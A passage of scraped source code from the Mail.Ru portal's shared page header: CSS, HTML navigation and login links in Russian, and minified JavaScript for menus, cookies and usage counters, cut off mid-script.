(-webkit-min-device-pixel-ratio: 1.5), only screen and (min--moz-device-pixel-ratio: 1.5), only screen and (-o-min-device-pixel-ratio: 3 / 2), only screen and (min-device-pixel-ratio: 1.5){.x-ph-ico_camera:hover:after{background-position:4px -60px}}.x-ph-ico_exit:after{background-position:-26px 3px}@media only screen and (-webkit-min-device-pixel-ratio: 1.5), only screen and (min--moz-device-pixel-ratio: 1.5), only screen and (-o-min-device-pixel-ratio: 3 / 2), only screen and (min-device-pixel-ratio: 1.5){.x-ph-ico_exit:after{background-position:-26px -15px}}.x-ph-ico_exit:hover:after{background-position:-26px -86px}@media only screen and (-webkit-min-device-pixel-ratio: 1.5), only screen and (min--moz-device-pixel-ratio: 1.5), only screen and (-o-min-device-pixel-ratio: 3 / 2), only screen and (min-device-pixel-ratio: 1.5){.x-ph-ico_exit:hover:after{background-position:-26px -60px}}.x-ph-ico_vk{background-color:#4e729a}.x-ph-ico_vk:after{background-position:-23px -173px}@media only screen and (-webkit-min-device-pixel-ratio: 1.5), only screen and (min--moz-device-pixel-ratio: 1.5), only screen and (-o-min-device-pixel-ratio: 3 / 2), only screen and (min-device-pixel-ratio: 1.5){.x-ph-ico_vk:after{background-position:-23px -101px}}.x-ph-ico_ok{background-color:#f58326}@media only screen and (-webkit-min-device-pixel-ratio: 1.5), only screen and (min--moz-device-pixel-ratio: 1.5), only screen and (-o-min-device-pixel-ratio: 3 / 2), only screen and (min-device-pixel-ratio: 1.5){.x-ph-ico_ok:after{background-position:-55px -103px}}.x-ph-ico_fb{background-color:#3d569a}@media only screen and (-webkit-min-device-pixel-ratio: 1.5), only screen and (min--moz-device-pixel-ratio: 1.5), only screen and (-o-min-device-pixel-ratio: 3 / 2), only screen and (min-device-pixel-ratio: 1.5){.x-ph-ico_fb:after{background-position:-55px -103px}}
/*# sourceMappingURL=external.css.map */
</style><table class="w-x-ph" cellspacing="0"><tbody><tr><td class="w-x-ph__col w-x-ph__col_left"><a rel="nofollow" class="x-ph__link x-ph__link_first" href="https://r.mail.ru/n201594642?sz=1&amp;rnd=794105198">Mail.Ru</a>

			
			
			
				
				
				
			
					
				
				
				
			
			
					
				<a rel="nofollow" id="ph_mail" class="x-ph__link" href="https://r.mail.ru/cls532246/e.mail.ru/messages/inbox/?siteid=105&amp;lang=ru_RU&amp;_1ld=1_1000043_1000475_0"><span class="x-ph__link__text x-ph__link_selected">Почта</span><i class="x-ph__link__balloon" id="g_mail_events">0</i></a><a style="" rel="nofollow" id="ph_my" class="x-ph__link" href="https://r.mail.ru/n201594643?_1ld=1_1000006_1000476_0"><span class="x-ph__link__text">Мой Мир</span><i class="x-ph__link__balloon" id="g_my_events">0</i></a><a style="" rel="nofollow" class="x-ph__link" href="https://r.mail.ru/n165226296?sz=1&amp;rnd=794105198"><span class="x-ph__link__text">Одноклассники</span><i class="x-ph__link__balloon" id="g_ok_events">0</i></a><a style="" rel="nofollow" class="x-ph__link" href="https://r.mail.ru/n107082206?sz=1&amp;rnd=794105198"><span class="x-ph__link__text">Игры</span><i class="x-ph__link__balloon" id="g_games_events">0</i></a><a style="" rel="nofollow" class="x-ph__link" href="https://r.mail.ru/n77699981?sz=1&amp;rnd=794105198"><span class="x-ph__link__text">Знакомства</span><i class="x-ph__link__balloon" id="g_love_events"></i></a><a style="" rel="nofollow" class="x-ph__link" href="https://r.mail.ru/n185049807?sz=1&amp;rnd=794105198">Новости
			</a><a style="" rel="nofollow" class="x-ph__link" href="https://r.mail.ru/n77699983?sz=1&amp;rnd=794105198">
				Поиск
			</a><a style="display: none;" id="PH_allProjects" rel="nofollow" class="x-ph__link" href="https://r.mail.ru/n201594644?sz=1&amp;rnd=794105198">
				Все проекты
			</a><span class="x-ph__menu" id="PH_projectsMenu" style="display: inline-block;"><i class="w-x-ph__menu__button__shadow w-x-ph__menu__button__shadow_left"></i><i class="w-x-ph__menu__button__shadow w-x-ph__menu__button__shadow_right"></i><a rel="nofollow" class="x-ph__menu__button" id="PH_projectsMenu_button" href="#"><i class="x-ph__menu__button__icon"></i><i class="x-ph__menu__button__text">Все проекты</i></a><div style="display: none;" class="x-ph__menu__dropdown x-ph__projects" id="PH_projectsMenu_dropdown"><div class="w-x-ph__menu__dropdown w-x-ph__projects"><div class="x-ph__projects__col x-ph__projects__col_1"><a rel="nofollow" href="https://r.mail.ru/n185049809?sz=1&amp;rnd=794105198" class="js-link x-ph__projects__link">Авто</a><a rel="nofollow" href="https://r.mail.ru/n201594645?sz=1&amp;rnd=794105198" class="js-link x-ph__projects__link">Афиша</a><a rel="nofollow" href="https://r.mail.ru/n185049810?sz=1&amp;rnd=794105198" class="js-link x-ph__projects__link">Гороскопы</a><a rel="nofollow" href="https://r.mail.ru/n112248336?sz=1&amp;rnd=794105198" class="js-link x-ph__projects__link">Деньги</a><a rel="nofollow" href="https://r.mail.ru/n185049811?sz=1&amp;rnd=794105198" class="js-link x-ph__projects__link">Дети</a><a rel="nofollow" href="https://r.mail.ru/n115575559?sz=1&amp;rnd=794105198" class="js-link x-ph__projects__link">Добро</a><a rel="nofollow" href="https://r.mail.ru/n185049812?sz=1&amp;rnd=794105198" class="js-link x-ph__projects__link">Здоровье</a></div><div class="x-ph__projects__col x-ph__projects__col_2"><a rel="nofollow" href="https://r.mail.ru/n153055346?sz=1&amp;rnd=794105198" class="js-link x-ph__projects__link">Календарь</a><a rel="nofollow" href="https://r.mail.ru/n185049813?sz=1&amp;rnd=794105198" class="js-link x-ph__projects__link">Леди</a><a rel="nofollow" href="https://r.mail.ru/n201594646?sz=1&amp;rnd=794105198" class="js-link x-ph__projects__link">Недвижимость</a><a rel="nofollow" href="https://r.mail.ru/n118988197?sz=1&amp;rnd=794105198" class="js-link x-ph__projects__link">Облако</a><a rel="nofollow" href="https://r.mail.ru/n77699985?sz=1&amp;rnd=794105198" class="js-link x-ph__projects__link">Ответы</a><a rel="nofollow" href="https://r.mail.ru/n185049814?sz=1&amp;rnd=794105198" class="js-link x-ph__projects__link">Погода</a><a rel="nofollow" href="https://r.mail.ru/n115198081?sz=1&amp;rnd=794105198" class="js-link x-ph__projects__link">Работа</a></div><div class="x-ph__projects__col x-ph__projects__col_3"><a rel="nofollow" href="https://r.mail.ru/n185049815?sz=1&amp;rnd=794105198" class="js-link x-ph__projects__link">Спорт</a><a rel="nofollow" href="https://r.mail.ru/n201594647?sz=1&amp;rnd=794105198" class="js-link x-ph__projects__link">ТВ программа</a><a rel="nofollow" href="https://r.mail.ru/n112248339?sz=1&amp;rnd=794105198" class="js-link x-ph__projects__link">Товары</a><a rel="nofollow" href="https://r.mail.ru/n185049808?sz=1&amp;rnd=794105198" class="js-link x-ph__projects__link">Cars</a><a rel="nofollow" href="https://r.mail.ru/n185049816?sz=1&amp;rnd=794105198" class="js-link x-ph__projects__link">Hi-Tech</a></div><div class="x-ph__projects__col x-ph__projects__col_4"><div class="x-ph__projects__col_separator"><a rel="nofollow" href="https://r.mail.ru/n94823514?sz=1&amp;rnd=794105198" class="js-link x-ph__projects__link x-ph__projects__link_icon x-ph__projects__link_agent"><i class="x-ph__projects__link_icon__pic x-ph__projects__link_icon__pic_agent"></i>Агент Mail.Ru</a><a rel="nofollow" href="https://r.mail.ru/n118988196?sz=1&amp;rnd=794105198" class="js-link x-ph__projects__link x-ph__projects__link_icon x-ph__projects__link_browser"><i class="x-ph__projects__link_icon__pic x-ph__projects__link_icon__pic_browser"></i>Браузер «Амиго»</a><a rel="nofollow" href="https://r.mail.ru/n94823515?sz=1&amp;rnd=794105198" class="js-link x-ph__projects__link x-ph__projects__link_icon x-ph__projects__link_icq"><i class="x-ph__projects__link_icon__pic x-ph__projects__link_icon__pic_icq"></i>ICQ</a></div><a rel="nofollow" href="https://r.mail.ru/n165226297?sz=1&amp;rnd=794105198" class="js-link x-ph__projects__link">Почта для бизнеса</a><a rel="nofollow" href="https://r.mail.ru/n165226298?sz=1&amp;rnd=794105198" class="js-link x-ph__projects__link">Почта для образования</a><a rel="nofollow" href="https://r.mail.ru/n107082207?sz=1&amp;rnd=794105198" class="js-link x-ph__projects__link">Рейтинг сайтов</a><a rel="nofollow" href="https://r.mail.ru/n193362698?sz=1&amp;rnd=794105198" class="js-link x-ph__projects__link" target="_blank">Таргет</a></div><div class="w-x-ph__menu__dropdown__clearfix"></div></div></div></span></td><td class="w-x-ph__col w-x-ph__col_right"><div id="PH_authView" style="display:none;"><table class="x-ph__auth" cellspacing="0"><tbody><tr><td class="w-x-ph__auth__col w-x-ph__auth__col_left"><span style="display: none;" id="PH_singleuser" class="x-ph__auth__user"><span class="w-x-ph__auth__user_inner"><span id="PH_user-email_disabled" class="x-ph__auth__user__text"></span><span class="x-ph__auth__user__fade"></span></span></span><div id="PH_miltiuser" style="display: block;" class="w-x-ph__auth__dropdown"><div class="w-x-ph__auth__dropdown__inner"><div class="x-ph__menu x-ph__menu_auth" id="PH_authMenu"><i class="w-x-ph__menu__button__shadow w-x-ph__menu__button__shadow_left"></i><i class="w-x-ph__menu__button__shadow w-x-ph__menu__button__shadow_right"></i><span class="x-ph__menu__button x-ph__menu__button_auth" id="PH_authMenu_button"><i class="x-ph__menu__button_auth__unread" title=""></i><i class="x-ph__menu__button__icon x-ph__menu__button__icon_auth"></i><i class="x-ph__menu__button__text x-ph__menu__button__text_auth" id="PH_user-email">undefined</i></span><span id="PH_bub:exit" class="x-ph-promoexit"></span><div style="display: none;" class="x-ph__menu__dropdown x-ph__menu__dropdown_auth" id="PH_authMenu_dropdown"><div class="w-x-ph__menu__dropdown w-x-ph__menu__dropdown_auth"><div class="w-w-x-ph__menu__dropdown_auth"><div class="x-ph__menu__dropdown_auth__loader"></div><div class="x-ph__menu__dropdown_auth__error">Произошла ошибка соединения</div><div class="x-ph__auth_list x-ph__auth_list_active" id="PH_authMenu_list_active"></div><div class="x-ph__menu__dropdown_auth__links" id="PH_authMenu_links"><a href="https://mail.ru/region?page=https%3A%2F%2Fe.mail.ru%2Flogin%3Femail%3Dlogin%40mail.ru%26fail%3D1" class="x-ph__menu__dropdown_auth__links__link" xname="clb10460649"><span class="x-ph__menu__dropdown_auth__links__link__text">Город: Абуджа</span></a><a href="https://e.mail.ru/settings/userinfo" class="x-ph__menu__dropdown_auth__links__link" xname="clb10460624"><span class="x-ph__menu__dropdown_auth__links__link__text">Личные данные</span></a><a href="https://e.mail.ru/settings/security" class="x-ph__menu__dropdown_auth__links__link" xname="clb10460635"><span class="x-ph__menu__dropdown_auth__links__link__text">Пароль и безопасность</span></a><div class="x-ph__menu__dropdown_auth__links__sep"></div><a href="https://r.mail.ru/clr781229/e.mail.ru/settings" class="x-ph__menu__dropdown_auth__links__link" xname=""><span class="x-ph__menu__dropdown_auth__links__link__text">Настройки почты</span></a></div><div class="x-ph__auth_list x-ph__auth_list_not-active" id="PH_authMenu_list_wrap"><div id="PH_authMenu_list"></div></div><div class="x-ph__menu__dropdown_auth__login" id="PH_menuLogin"><div class="x-ph__menu__dropdown_auth__info"><a rel="nofollow" href="http://r.mail.ru/clb1126001/help.mail.ru/mail-help/auth/multiauth" target="_blank" class="x-ph__menu__dropdown_auth__info__link"><span class="x-ph__menu__dropdown_auth__info__link__text">Вы можете одновременно работать<br>с несколькими почтовыми ящиками.</span> <span class="x-ph__menu__dropdown_auth__info__link__link">Узнать больше</span></a></div><a id="PH_loginAnotherLink" class="x-ph__menu__dropdown_auth__login__link js-login x-ph__button" href="https://e.mail.ru/cgi-bin/login?lang=ru_RU&amp;page=https%3A%2F%2Fe.mail.ru%2F&amp;from=multi" xname="clb1126061"><span class="x-ph__button__fake"><span class="js-text x-ph__button__fake__text">Добавить почтовый ящик</span></span></a></div></div></div></div></div></div></div></td><td class="w-x-ph__auth__col w-x-ph__auth__col_right"><a id="PH_logoutLink" rel="nofollow" class="x-ph__link x-ph__link_last x-ph__auth__link" xname="clb14767676" href="https://r.mail.ru/cls1074201/auth.mail.ru/cgi-bin/logout?next=1&amp;lang=ru_RU&amp;Page=" title="выход">
							выход
						</a></td></tr></tbody></table></div><div id="PH_noAuthView"><table class="x-ph__auth" cellspacing="0"><tbody><tr><td class="w-x-ph__auth__col w-x-ph__auth__col_right"><a id="PH_regLink" rel="nofollow" class="x-ph__link x-ph__auth__link" href="https://r.mail.ru/cls532246/r.mail.ru/clb1126008/e.mail.ru/signup?_1ld=1_1000000_1000477_0&amp;from=navi&amp;lang=ru_RU&amp;siteid=105&amp;rnd=794105198">Регистрация</a><a id="PH_authLink" rel="nofollow" class="x-ph__link x-ph__link_last x-ph__auth__link" href="https://e.mail.ru/cgi-bin/login?lang=ru_RU&amp;page=https%3A%2F%2Fe.mail.ru%2F">Вход</a></td></tr></tbody></table></div></td></tr></tbody></table></div><div id="PH_innerHTML" style="display:none;"></div><div id="PH_links" style="display:none;"><a id="PH_link_bizmail" href="https://r.mail.ru/n165226297?sz=1&amp;rnd=794105198"></a><a id="PH_link_edumail" href="https://r.mail.ru/n165226298?sz=1&amp;rnd=794105198"></a><a id="PH_link_cars" href="https://r.mail.ru/n185049808?sz=1&amp;rnd=794105198"></a><a id="PH_link_target" href="https://r.mail.ru/n193362698?sz=1&amp;rnd=794105198"></a><a id="PH_link_dobro" href="https://r.mail.ru/n115575559?sz=1&amp;rnd=794105198"></a><a id="PH_link_biz" href="https://r.mail.ru/n115575560?sz=1&amp;rnd=794105198"></a><a id="PH_link_finance" href="https://r.mail.ru/n118798992?sz=1&amp;rnd=794105198"></a><a id="PH_link_moto" href="https://r.mail.ru/n109367822?sz=1&amp;rnd=794105198"></a><a id="PH_link_auto" href="https://r.mail.ru/n185049809?sz=1&amp;rnd=794105198"></a><a id="PH_link_afisha" href="https://r.mail.ru/n201594645?sz=1&amp;rnd=794105198"></a><a id="PH_link_video" href="https://r.mail.ru/n77700000?sz=1&amp;rnd=794105198"></a><a id="PH_link_horo" href="https://r.mail.ru/n185049810?sz=1&amp;rnd=794105198"></a><a id="PH_link_money" href="https://r.mail.ru/n112248336?sz=1&amp;rnd=794105198"></a><a id="PH_link_deti" href="https://r.mail.ru/n185049811?sz=1&amp;rnd=794105198"></a><a id="PH_link_health" href="https://r.mail.ru/n185049812?sz=1&amp;rnd=794105198"></a><a id="PH_link_calendar" href="https://r.mail.ru/n153055346?sz=1&amp;rnd=794105198"></a><a id="PH_link_lady" href="https://r.mail.ru/n185049813?sz=1&amp;rnd=794105198"></a><a id="PH_link_realty" href="https://r.mail.ru/n201594646?sz=1&amp;rnd=794105198"></a><a id="PH_link_answer" href="https://r.mail.ru/n77699985?sz=1&amp;rnd=794105198"></a><a id="PH_link_cards" href="https://r.mail.ru/n77699996?sz=1&amp;rnd=794105198"></a><a id="PH_link_pogoda" href="https://r.mail.ru/n185049814?sz=1&amp;rnd=794105198"></a><a id="PH_link_travel" href="https://r.mail.ru/n112248338?sz=1&amp;rnd=794105198"></a><a id="PH_link_work" href="https://r.mail.ru/n115198081?sz=1&amp;rnd=794105198"></a><a id="PH_link_raiting" href="https://r.mail.ru/n107082207?sz=1&amp;rnd=794105198"></a><a id="PH_link_sport" href="https://r.mail.ru/n185049815?sz=1&amp;rnd=794105198"></a><a id="PH_link_tv" href="https://r.mail.ru/n201594647?sz=1&amp;rnd=794105198"></a><a id="PH_link_torg" href="https://r.mail.ru/n112248339?sz=1&amp;rnd=794105198"></a><a id="PH_link_files" href="https://r.mail.ru/n77699991?sz=1&amp;rnd=794105198"></a><a id="PH_link_hitech" href="https://r.mail.ru/n185049816?sz=1&amp;rnd=794105198"></a><a id="PH_link_agent" href="https://r.mail.ru/n94823514?sz=1&amp;rnd=794105198"></a><a id="PH_link_browser" href="https://r.mail.ru/n118988196?sz=1&amp;rnd=794105198"></a><a id="PH_link_sputnik" href="https://r.mail.ru/n96156682?sz=1&amp;rnd=794105198"></a><a id="PH_link_icq" href="https://r.mail.ru/n94823515?sz=1&amp;rnd=794105198"></a><a id="PH_link_cloud" href="https://r.mail.ru/n118988197?sz=1&amp;rnd=794105198"></a></div><!--[if IE 6]><script>
	var ____________ie6 = true;
</script><![endif]--><!--[if IE 7]><script>
	var ____________ie7 = true;
</script><![endif]--><script>
if (!window.__PHS){
	var __PHS = {};
}
(function(s){
	s.nonce = '';
	s.newDesign = true;
	
	s.authFormExtDomainsEnabled = true;
	s.portalAuthEnabled = true;
	s.disableGamesCounter = false;
	s.staticDir = '//img.imgsmail.ru/p/h/d/0.37.16/';
	s.loginLink = 'https://e.mail.ru/cgi-bin/login?lang=ru_RU&page=https%3A%2F%2Fe.mail.ru%2F';
	s.loginLinkXName = 'clb1126061';
	s.externalJS = '//img.imgsmail.ru/p/h/d/0.37.16/external.min.js';
	s.pv = '2';
	s.eid = '';
	s.siteid = '105';
	s.registerBackUrl = false;
	s.bizLinks = false;
	s.loveCounter = true;
	s.mailEvents = false;
	s.disableIFCheck = false;
	s.mailSplashUpdate = false;

	s.region = 'Абуджа';
	s.regionEnabled = true;
	s.settingsText = "Настройки почты";
	s.settingsPage = "https://r.mail.ru/clr781229/e.mail.ru/settings";
	s.promoExit = false;
	s.promoRegion = false;
	s.showPassword = false;
	s.loginFromProject = false;
	s.icoExit = false;
	s.ZADblock = false;
	s.pauseUpdate = false;
	s.pauseUpdateTime = 0;

	s.authGate = false;
	s.authGateJS = 'https://img.imgsmail.ru/ag/l.js';
	s.socialAuth = false;

	if (!s.lang){
		s.lang = "ru_RU";
	}
})(window['__PHS']);
(function(){function M(a){for(var a=a||{},d=1,b=arguments.length;d<b;d++){var e=arguments[d],c;for(c in e)e.hasOwnProperty(c)&&(a[c]=e[c])}return a}function ba(a,d){for(var b in d)Object.prototype.hasOwnProperty.call(d,b)&&!Object.prototype.hasOwnProperty.call(a,b)&&(a[b]=d[b]);return a}function N(a){return document.getElementById(a)}function ca(a,d,b,e){var c="",i=[],l=0;if("string"===typeof a)i.push([a,d]),l+=d,"object"==typeof b&&(e=b,b=G);else{for(var k in a)a.hasOwnProperty(k)&&(i.push([k,a[k]]),
l+=a[k]);"string"==typeof d?(e=b,b=d):"object"==typeof d&&(e=d,b=G)}a=0;for(d=i.length;a<d;a++)i[a]=i[a].join(":");if("object"==typeof e&&e.rlog_message&&e.rlog_message.length)for(var j in e)c+="&"+j+"="+("string"==typeof e[j]?e[j]:e[j].join(","));(new Image).src="//stat.radar.imgsmail.ru/update?p=headline&t="+b+"&v="+l+"&i="+i.join(",")+(document.referrer?"&r="+escape(document.referrer):"")+c+"&rnd="+Math.random()}function da(a,d){return a.bind.apply(a,H.call(arguments,1))}function ea(a,d,b){function e(){a();
i||(c=I(e,d))}var c,i;b&&a();c=I(e,d);return function(){i=!0;O(c)}}function fa(a){a.stopPropagation?a.stopPropagation():a.cancelBubble=!0;a.preventDefault?a.preventDefault():a.returnValue=!1}function ga(a){a.preventDefault?a.preventDefault():a.returnValue=!1}function P(a,d,b,c){if(d)if(d.addEventListener)d[a?"addEventListener":"removeEventListener"](b,c,!1);else d[a?"attachEvent":"detachEvent"]("on"+b,c)}function w(a){return a&&1==a.nodeType}function Q(a){(function(){for(var a,b=arguments,e=b.length;e--;){a=
b[e].split(",");for(var f=a.length;f--;){var i=a[f],l=void 0,k=parseInt(1E9*Math.random()),j=void 0;if(l=i.match(/^(?:cl([bn])|([adgin]))(\d+)(?:sz(\d+))?/))l[1]?j="s"+l[1]:"n"==l[2]?j="nc":("i"==l[2]&&(k=null),j=l[2]),j+=l[3]+".gif?",l[4]&&(j+="sz="+l[4]),k&&(j+="&rnd="+k),c.settings.eid&&(j+="&test_id="+c.settings.eid),(new Image).src="//rs.mail.ru/"+j}}})(a)}function ha(a){P(1,a,"mousedown",function(a){a||(a=window.event);for(a=a.target||a.srcElement;a;)a.getAttribute&&a.getAttribute("xname")&&
Q(a.getAttribute("xname")),a=a.parentNode})}function ia(a,d){var b;b=w(d)?function(a,d){return a==d}:function(a,d){return z(a,d)};for(var c=a.parentNode;c;){if(b(c,d))return c;c=c.parentNode}return!1}function ja(a){for(;a.firstChild;)a.removeChild(a.firstChild)}function z(a,d){return w(a)&&A?a.classList.contains(d):!!~(" "+a.className+" ").indexOf(" "+d+" ")}function B(a,d){if(w(a))if(A)for(var d=d.split(" "),b=0;b<d.length;b++)a.classList.add(d[b]);else!z(a,d)&&(a.className+=" "+d)}function R(a,
d){w(a)&&(A?a.classList.remove(d):a.className=a.className.replace(RegExp("(^|\\s)"+d+"(\\s|$)","g"),"$1"))}function ka(a,d){if(!w(a))return A?a.classList.toggle(d):z(a,d)?(R(a,d),!1):(B(a,d),!0)}function la(a){return"string"!==typeof a||!a?null:(new Function("return "+a))()}function ma(){return!!b.SCookie.getGlobal(S)}function C(a,d,b){if(void 0!==d){var c,b=b||{};null===d&&(d="",b.expires=-1);d+="";document.cookie=a+"="+d+(b.expires&&(c="number"==typeof b.expires&&(c=new Date),c.setTime(c.getTime()+
864E5*b.expires),c||"toUTCString"in b.expires&&b.expires)&&"; expires="+c.toUTCString()||"")+(b.path?"; path="+b.path:"")+(b.domain?"; domain="+b.domain:"")+(b.secure?"; secure":"");return d}if(""!==(document.cookie||""))return d=(document.cookie.match(RegExp("(?:^| )"+a+"\\=(\\S*)(?:; |$)"))||[])[1],void 0===d?void 0:d}function T(){this._invocations=[];this._context=this._fn=null}function v(){}function J(a){this._node=b.byId(a);this._container=this._node.parentNode}function na(a){this._counters=
a;for(var b in this._counters)this._counters.hasOwnProperty(b)&&(this._counters[b]=new J(this._counters[b]));this.update=function(a,b){if("string"==typeof a){var d={};d[a]=b;this.update(d)}else for(d in a)a.hasOwnProperty(d)&&(this._counters[d].update(a[d]),this._counters[d]._isAnim=c.activeUser())}}function p(a){p.__all.push(this);this._opts=a;this._open=b.bind(this._open,this);this._baseClass=a.baseClass;this._rootNode=a.rootNode;this._dropdown=a.dropdown;this._button=a.button;this._openCounter=
a.openCounter||null;this._hideTimeout=null;this._orientation=this._opts.orientation;this._openClass=this._baseClass+"_open";this._rightClass=this._openClass+"_right";this._leftClass=this._openClass+"_left";this._inited=!!this._dropdown;this._triggerHideOnInit=this._triggerShowOnInit=!1;b.event(1,this._button,"click",b.bind(this.show,this))}function q(a,b){b=b||{};this._url=a;this._encoding=b.encoding;this._JSONPCallbackParam=b.JSONPCallbackParam||"callback";this._xhrEnabled=b.xhrEnabled||!1;this._processing=
!1;this._requestSource=b.requestSource;this._xhr2Supported=!1;try{XMLHttpRequest&&"withCredentials"in new XMLHttpRequest&&(this._xhr2Supported=!0)}catch(c){}}function oa(a){function d(){i!==(i=location.hash.replace(/^#/,"")||null)&&e()}this._userEmail=a.userEmail;this.____user=this._userEmail.innerHTML||void 0;var g="string"==typeof this.____user&&this.____user.length;this._user=c.settings.loginFromProject&&"mail"==b.project&&g?this.____user:null;this._updateByTimeout=a.updateByTimeout;this.updateLastRequest=
0;this._noAuthView=a.noAuthView;this._authView=a.authView;this.updateAccountInfo();var e=b.bind(this.updateAccountInfo,this),f=!1;if(!this._updateByTimeout)if(window.jsHistory&&window.jsHistory.change)window.jsHistory.change(function(){f&&e();f=!0});else if("onhashchange"in window)b.event(1,window,"hashchange",e);else{var i=location.hash.replace(/^#/,"")||null;b.setIntervalByTimeout(d,50)}}function U(a,b){var g=document.createElement("script"),e=document.getElementsByTagName("head")[0];"undefined"!==
typeof b&&(g.defer="defer",g.async="async");c.settings.nonce&&g.setAttribute("nonce",c.settings.nonce);g.type="text/javascript";g.src=a;!("opera"in window)||"complete"===document.readyState?e.appendChild(g):window.addEventListener("DOMContentLoaded",function(){e.appendChild(g)},!1)}var u=window.console||{};u.log=u.log||function(){};u.time=u.time||function(){};u.timeEnd=u.timeEnd||function(){};u.time("headline.inline.js");if(!window.__PH){var c=window.__PH={},b={};c.settings=window.__PHS;c.settings.swaDomain=
"//portal.mail.ru";c.settings.authDomain="https://auth.mail.ru";/^https?:\/\/[^/]*?\.dev\.mail\.ru($|\/\S*)/i.test(location.href)?(c.settings.swaDomain="//portal.dev.mail.ru",c.settings.authDomain="https://auth.dev.mail.ru"):/^https?:\/\/[^/]*?\.devmail\.ru($|\/\S*)/i.test(location.href)&&(c.settings.swaDomain="//portal.devmail.ru",c.settings.authDomain="https://auth.devmail.ru");c.settings.swaTest&&(c.settings.swaDomain="//portal.test.mail.ru",c.settings.authDomain="https://test.auth.mail.ru");c._=
b;if(!c.settings.disableIFCheck)try{top.location.toString()}catch(va){top.location=location}var G="mail",I=window.setTimeout,O=window.clearTimeout,s=N("portal-headline"),t=!1,n=navigator.userAgent,m=[];-1!=n.indexOf("Firefox")?m.push("x-ph-ff"):-1!=n.indexOf("Opera")?m.push("x-ph-opera"):-1!=n.indexOf("Chrome/40")&&m.push("x-ph-chrome40");if(-1!=n.indexOf("iPad")||-1!=n.indexOf("iPhone")||-1!=n.indexOf("iPod"))m.push("x-ph-ios"),t=!0;-1!=n.indexOf("Mac OS")&&!t?m.push("x-ph-mac"):-1!=n.indexOf("Windows")?
m.push("x-ph-win"):m.push("x-ph-not-desk");"ontouchstart"in window?m.push("x-ph-touch"):m.push("x-ph-no-touch");s.className+=" "+m.join(" ");var H=Array.prototype.slice;void 0===Function.prototype.bind&&(Function.prototype.bind=function(a){var b=H.call(arguments,1),c=this;return function(){return c.apply(a,b.concat(H.call(arguments,0)))}});var A="classList"in document.documentElement,n=Array.prototype.indexOf?function(a,b){return Array.prototype.indexOf.call(a,b)}:function(a,b){for(var c=0,e=a.length;c<
e;c++)if(a[c]==b)return c;return-1},m=window.devicePixelRatio,pa=void 0!=document.createElement("div").style.backgroundSize&&1<m,S="s_c",K,V=document.createElement("div"),W=["Khtml","Ms","O","Moz","Webkit"],X=W.length;K=function(a){if(a in V.style)return!0;for(a=a.replace(/^[a-z]/,function(a){return a.toUpperCase()});X--;)if(W[X]+a in V.style)return!0;return!1};K("textShadow")?B(s,"x-ph-box-shadow"):B(s,"x-ph-no-box-shadow");var D=1*new Date+"",qa=D.substring(D.length-2),D=b,ra=G,sa=/\s*(\S+)\s*/g,
ta=!/\[native\s+code\]/i.test(document.getElementsByClass+""),ua=/\./g;M(D,{percent:function(a){return qa<a},supports:K,extend:M,append:ba,dpr:m,retina:pa,project:ra,setTimeout:function(a,b){return I(a,b)},clearTimeout:function(a){return O(a)},rootNode:s,byId:N,byClassName:function(a,b,c){var e,f;"string"===typeof a&&(c=b,b=a,a=document);c=c||"";if(!a||null==b)return[];b=b.replace(/\s+/ig,".");"."!=b[0]&&(b="."+b);if("querySelectorAll"in a){c=a.querySelectorAll(c+b);if(ta){e=-1;for(a=[];f=c[++e];)a.push(f);
return a}return c}c=a.getElementsByTagName(c||"*");b&&(b=b.replace(ua," "),b=RegExp(b.replace(sa,"(?=(^|.*\\s)$1(\\s|$))")));e=-1;for(a=[];f=c[++e];)1===f.nodeType&&(!b||b.test(f.className))&&a.push(f);return a},radar:ca,bind:da,setIntervalByTimeout:ea,eventCancel:fa,eventPreventDefault:ga,event:P,isNode:w,emptyNode:ja,count:Q,countEl:ha,hasParent:ia,hasClass:z,removeClass:R,addClass:B,toggleClass:ka,ArrayIndexOf:n,parseJson:la,isCorp:ma,isCorpCookie:S,iOs:t});var h={_S_cookie_set_get_remove:function(a,
b,c,e){var f,i=RegExp("(^|\\|)("+c+"=)(.*?)(\\||$)"),l={domain:b,expires:365,path:"/"};if(c){b=C(a)||"";f=(b.match(i)||[])[3];var k=null;void 0!==e?(C(a,void 0!==f||null===e?k=b.replace(i,null===e?function(a,b,d,c,g,e,f){return 0===f.indexOf(a)?"":g}:"$1$2"+e+"$4"):(b?b+"|":"")+c+"="+e,l),""===k&&C(a,null,l)):e=f;return e}},_throw_noValue_Error:function(){throw Error("need value");},__prefix:null,__domain:".mail.ru",setProject:function(a,b){if(!a||!b)throw Error("project is not valid");"."!==b.substr(0,
1)&&(b="."+b);h.__prefix=a;h.__domain=b},_getPrefix:function(a){a||(a={});a.prefix=a.prefix||h.__prefix;a.domain=a.domain||h.__domain;if(!a.prefix||!a.domain)throw Error("run setProject before");return a},getGlobal:function(a){return h._S_cookie_set_get_remove("s",h.__domain,a)},setGlobal:function(a,b){void 0===b&&h._throw_noValue_Error();h._S_cookie_set_get_remove("s",h.__domain,a,b);return h.getGlobal(a)},removeGlobal:function(a){var b=h.getGlobal(a);h._S_cookie_set_get_remove("s",h.__domain,a,
null);return b},getLocal:function(a,b){b=h._getPrefix(b);return h._S_cookie_set_get_remove("s_"+b.prefix,b.domain,a)},setLocal:function(a,b,c){c=h._getPrefix(c);void 0===b&&h._throw_noValue_Error();h._S_cookie_set_get_remove("s_"+c.prefix,c.domain,a,b);return h.getLocal(a,c)},removeLocal:function(a,b){var b=h._getPrefix(b),c=h.getLocal(a,b);h._S_cookie_set_get_remove("s_"+b.prefix,b.domain,a,null);return c}};try{var x=window.location.host;".devmail.ru"==x.substring(x.length-11,x.length)&&(h.__domain=
".devmail.ru")}catch(wa){}b.SCookie=h;T.prototype={getQuery:function(){var a=b.bind(this.invoke,this);a.replace=b.bind(this.replace,this);return a},invoke:function(){this._fn?this._fn.apply(this._context,arguments):this._invocations.push(arguments)},replace:function(a,b){if(!this._fn){for(var b=b||window,c=0,e=this._invocations.length;c<e;c++)a.apply(b,this._invocations[c]);delete this._invocations;this._fn=a;this._context=b}}};b.extend(b,{DeferredQuery:T});v.prototype={emit:function(a,b,c){function e(){--i||
